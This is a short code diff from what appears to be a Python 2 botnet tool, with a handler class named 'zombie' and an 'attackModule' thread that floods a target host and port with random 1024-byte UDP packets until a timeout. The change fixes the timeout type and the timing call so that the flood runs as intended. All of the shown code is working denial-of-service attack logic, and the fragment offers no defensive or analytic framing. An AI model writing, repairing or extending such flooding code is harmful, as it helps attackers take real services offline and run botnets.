@@ -34,7 +34,7 @@ class zombie(SocketServer.BaseRequestHandler):
 class attackModule(threading.Thread):
     def __init__(self, timeout, target, port, num):
         threading.Thread.__init__(self)
-        self.timeout = timeout
+        self.timeout = int(timeout)
         self.target = target
         self.port = int(port)
 
@@ -46,8 +46,8 @@ class attackModule(threading.Thread):
         victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         MESSAGE = os.urandom(1024)
 
-        start = time.clock()
-        while time.clock() - start < self.timeout:
+        start = time.time()
+        while time.time() - start < self.timeout:
             victim.sendto(MESSAGE, (self.target, self.port))
 
         print "ended attack run"
